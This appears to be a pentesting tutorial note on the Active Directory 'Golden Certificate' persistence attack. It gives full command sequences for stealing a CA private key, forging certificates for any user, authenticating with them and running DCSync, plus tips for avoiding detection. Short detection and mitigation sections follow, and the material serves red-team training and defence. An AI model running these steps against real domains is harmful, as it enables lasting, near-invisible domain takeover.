---
title: "Golden Certificate Attack — DPERSIST1"
description: "The Golden Certificate Attack is a domain persistence technique — not a privilege escalation. By the time you execute this attack, you have already fully…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "privilege-escalation", "persistence"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/Golden Certificate Attack — DPERSIST1.md"
---
# Golden Certificate Attack — DPERSIST1

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Domain Persistence |
| **Difficulty** | Easy (post-compromise) |
| **Pre-requisites** | Local admin on CA server + software-protected CA key (no HSM) |
| **Tools** | Certipy (backup/forge), ForgeCert, Mimikatz, SharpDPAPI |
| **OPSEC Noise** | Low — forged certs generate zero CA logs |
| **MITRE ATT&CK** | T1649 — Steal or Forge Authentication Certificates |
| **One-liner** | Extract CA private key → forge certificates offline for any user indefinitely → authenticate with forged cert. |

***

## What Is the Golden Certificate Attack?

The Golden Certificate Attack is a **domain persistence technique** — not a privilege escalation. By the time you execute this attack, you have already fully compromised the domain. The goal is to ensure that **even if every password in the domain is reset, every account is disabled, and every other backdoor is removed, you can still authenticate as any user you want — indefinitely**.

The analogy to the Golden Ticket attack is exact and intentional:

| | Golden Ticket | Golden Certificate |
|---|---|---|
| **What is stolen** | `krbtgt` account hash | CA certificate + private key |
| **What is forged** | Kerberos TGT | X.509 certificate |
| **Signed by** | KRBTGT secret key | CA private key |
| **Impersonate any user** | ✅ | ✅ |
| **Validity period** | Set by attacker (years) | Set by attacker (decades) |
| **Revoked by password reset** | ✅ Rotating `krbtgt` hash invalidates tickets | ❌ **Certificate is still valid — CA private key never changes** |
| **Revoked by account deletion** | ✅ | ❌ **Forged cert has no dependency on AD object** |
| **MITRE ATT&CK** | T1558.001 | **T1649 — Steal or Forge Authentication Certificates** |

The devastating reality: **there is no easy recovery from a stolen CA private key short of revoking the entire CA and re-issuing every certificate in the domain**. This is why Golden Certificates are one of the most dangerous persistence techniques in the ADCS attack catalogue.

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| **Local admin on the CA server** | This is a post-exploitation / persistence technique — you need to have already compromised the domain  |
| CA private key is software-protected | If stored in an HSM (Hardware Security Module), certipy backup will fail — HSMs are specifically designed to prevent key extraction  |
| CA certificate is accessible | Almost always true — it's stored in the CA's certificate store and in AD |

***

## Understanding CA Key Storage

Before extracting, understand where the private key lives:

```
Default (software key): 
  %SystemRoot%\System32\CertSvc\CertEnroll\
  Backed by DPAPI (Data Protection API)
  → Certipy can extract automatically with local admin

HSM-protected key:
  Stored in physical HSM device
  → Private key CANNOT be extracted
  → Golden Certificate attack is NOT possible
  → Check with: certutil -getkey <CA-Name>
```

***

## Step 0 — Confirm Local Admin on CA

```bash
# Verify local admin access to the CA server
netexec smb <CA-IP> -u 'administrator' -p 'Password123!'
netexec smb <CA-IP> -u 'administrator' -H :NTHASH --local-auth

# If the CA is on the DC (most common in lab environments)
netexec smb $TARGET -u 'administrator' -H :ADMIN_NTHASH
```

***

## Step 1 — Extract the CA Certificate and Private Key

Certipy's `backup` command does the heavy lifting — it automatically dumps the CA cert and private key from the CA server using DPAPI:

```bash
# From Linux with domain admin credentials
certipy-ad backup \
  -u 'administrator@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -target <CA-IP>

# With NT hash
certipy-ad backup \
  -u 'administrator@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET \
  -target <CA-IP>
```

**Expected output:**
```
[*] Creating backup of 'DOMAIN-CA'
[*] Got certificate and private key of 'DOMAIN-CA'
[*] Saving certificate and private key to 'DOMAIN-CA.pfx'
[*] Done!
```

> ⚠️ **Protect `DOMAIN-CA.pfx` with your life.** This file IS your persistent access to the entire domain. Store it encrypted. Do not leave it on the target machine.

***

## Alternative Extraction Methods

### Method A — Mimikatz (on the CA server directly)

```powershell
# On the CA server as local admin
mimikatz.exe

# Dump the CA private key via DPAPI + crypto
lsadump::lsa /patch
crypto::capi
crypto::cng
crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export
```

### Method B — SharpDPAPI (DPAPI-based extraction)

```powershell
# Extract CA private key using machine DPAPI masterkey
.\SharpDPAPI.exe certificates /machine
```

### Method C — certutil (native Windows, stealthy)

```powershell
# Export CA cert + private key to PFX from CA server
certutil -exportPFX -p "ExportPassword" My <CA-thumbprint> C:\Windows\Temp\ca.pfx
```

### Method D — Remote registry via Impacket

```bash
# If you can access the CA remotely but don't have a shell
secretsdump.py 'domain.htb/administrator:Password123!'@<CA-IP> -just-dc-ntlm
# Then use the extracted DPAPI keys to decrypt the CA key offline
```

***

## Step 2 — Forge a Golden Certificate for Any User

With the CA cert and private key in hand, you can now **sign certificates offline** for any user in the domain — no CA interaction required:

```bash
# Forge a certificate for Administrator
certipy-ad forge \
  -ca-pfx 'DOMAIN-CA.pfx' \
  -upn 'administrator@domain.htb' \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=htb'

# Output: administrator_forged.pfx

# Forge for any user — domain admin, service account, etc.
certipy-ad forge \
  -ca-pfx 'DOMAIN-CA.pfx' \
  -upn 'krbtgt@domain.htb' \
  -subject 'CN=krbtgt,CN=Users,DC=domain,DC=htb'

# Forge with custom validity — set it to 10 years
certipy-ad forge \
  -ca-pfx 'DOMAIN-CA.pfx' \
  -upn 'administrator@domain.htb' \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=htb' \
  -validity 3650    # Days — 10 years
```

**Expected output:**
```
[*] Forging certificate
[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Done!
```

> 💡 The forged certificate is **cryptographically signed by the real CA private key** — it is indistinguishable from a legitimately issued certificate. No request was ever sent to the CA. No event logs were generated. No request ID exists.

***

## Step 3 — Authenticate with the Forged Certificate

```bash
certipy-ad auth \
  -pfx administrator_forged.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

***

## Step 4 — Shell / DCSync

```bash
# Kerberos TGT
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
secretsdump.py -k -no-pass DC01.domain.htb

# Pass-the-Hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
```

***

## The Full Offline Workflow (No CA Contact Required)

This is what makes the Golden Certificate so powerful — **Steps 2–4 are entirely offline**:

```
[ONLINE — requires CA access]                [OFFLINE — no network needed]
─────────────────────────────                ──────────────────────────────
certipy backup → DOMAIN-CA.pfx    ──────►   certipy forge → forged.pfx
                                             (sign any cert, any user,
                                              any validity, anytime,
                                              on any machine,
                                              forever)
                                             certipy auth → TGT + hash
```

You extract the CA key **once**, exfiltrate it **once**, and then forge certificates **indefinitely** from your own machine with zero interaction with the target domain.

***

## Windows Equivalent — ForgeCert

```powershell
# ForgeCert by SpecterOps — Windows equivalent of certipy forge
.\ForgeCert.exe \
  --CaCertPath DOMAIN-CA.pfx \
  --CaCertPassword "" \
  --Subject "CN=FakeCert" \
  --SubjectAltName "administrator@domain.htb" \
  --NewCertPath forged_admin.pfx \
  --NewCertPassword "NewPassword"

# Authenticate with Rubeus
.\Rubeus.exe asktgt \
  /user:administrator \
  /certificate:forged_admin.pfx \
  /password:"NewPassword" \
  /getcredentials \
  /nowrap
```

***

## Golden Certificate vs Golden Ticket — Persistence Comparison

| Factor | Golden Ticket | Golden Certificate |
|--------|--------------|-------------------|
| **Killed by** | Rotating `krbtgt` hash **twice** | Revoking the **entire CA** |
| **Affected by account deletion** | ✅ (if PAC validation enforced) | ❌ Cert has no dependency on AD object |
| **Affected by password reset** | ✅ (in theory) | ❌ Cert still valid |
| **Offline forgery** | ✅ | ✅ |
| **Evidence of initial extraction** | LSASS memory access / DCSync | DPAPI access on CA server |
| **Evidence of forged usage** | Unusual TGT lifetime, missing PAC data | ⚠️ Very minimal — only auth event |
| **Difficulty to detect** | Medium | **Hard** |
| **Difficulty to recover from** | Medium (two krbtgt resets) | **Very Hard (full CA rebuild)** |

***

## Detection Indicators

- **Certipy backup usage** — `secretsdump`-style DPAPI access on the CA server: look for unexpected access to `%SystemRoot%\System32\CertSvc\CertEnroll\`
- **Event ID 70** on the CA — CA certificate exported
- **Forged cert usage** — Watch for PKINIT authentication (Event ID 4768 with pre-auth type `16`) where the certificate serial number **does not exist** in the CA's issued certificate database
- **Certificate serial number mismatch** — The forged cert will have a serial number never recorded by the CA — monitor CA issued cert logs against auth events
- **BloodHound** — `GoldenCert` edge from a compromised principal to the CA object

***

## Mitigation

- **Protect CA private key with an HSM** — Hardware Security Modules physically prevent key extraction; this is the single most effective countermeasure
- **Harden CA server access** — Treat the CA server with the same security level as a Domain Controller: restrict local admin, no unnecessary software, dedicated admin accounts only
- **Monitor DPAPI access** on the CA server — unexpected access to the certificate store outside of scheduled CA operations is a red flag
- **Certificate Transparency (CT) logging** — Log all issued certificates; monitor for serial numbers being used for PKINIT that were never recorded in the CA database
- **Enable CA auditing** — Event ID 70 fires on certificate export — this should alert immediately
- **Restrict physical and RDP access** to the CA server — lateral movement to the CA should be near-impossible in a hardened environment

***

## OPSEC Considerations

| Action | Event Generated | Noise Level |
|--------|----------------|-------------|
| CA key extraction (`certipy backup`) | Event ID 70 on CA (cert export) + DPAPI access | 🟡 Medium |
| Certificate forgery (`certipy forge`) | **None** — entirely offline | 🟢 None |
| Forged cert authentication | Event ID 4768 (PKINIT) — serial number mismatch | 🟢 Low |
| DCSync with forged identity | Event ID 4662 (replication) | 🔴 High |

> ⚠️ The **initial key extraction** is the only noisy step. Once the CA PFX is exfiltrated, all subsequent forgery and authentication operations are **completely invisible** to the target CA. The forged certificate will have a serial number that does not exist in the CA's issued certificate database — this is the only detection vector.

***

## References

- [Domain Persistence: Golden Certificate Attack — Hacking Articles](https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/)
- [Golden Certificate — The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate)
- [Golden Certificate & OCSP — Cloud Brothers](https://cloudbrothers.info/en/golden-certificate-ocsp/)
- [Golden Certificate — Penetration Testing Lab](https://pentestlab.blog/2021/11/15/golden-certificate/)
- [GoldenCert Edge — SpecterOps BloodHound](https://bloodhound.specterops.io/resources/edges/golden-cert)
- [An Introduction to Golden Certificates — Cyberstoph](https://cyberstoph.org/posts/2019/12/an-introduction-to-golden-certificates/)
